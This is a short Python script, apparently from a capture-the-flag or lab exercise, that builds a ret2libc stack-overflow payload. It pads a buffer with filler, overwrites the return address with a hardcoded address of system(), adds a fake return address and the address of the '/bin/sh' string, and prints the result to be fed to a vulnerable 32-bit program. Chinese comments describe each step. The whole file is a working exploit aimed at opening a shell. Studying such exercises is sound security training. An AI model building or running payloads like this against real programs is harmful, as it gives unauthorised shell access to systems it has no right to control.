# -*- coding: utf-8 -*-
import struct
buffer="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"#填满缓冲区
system=struct.pack("I",0xb7ecffb0)
sys_ret="AAAA"#虚假的返回地址
binsh=struct.pack("I",0xb7e97000+1176511)
padding=buffer+system+sys_ret+binsh#先溢出再调用system的入口再构造虚假的返回地址，再将/bin/sh入栈
print(padding)
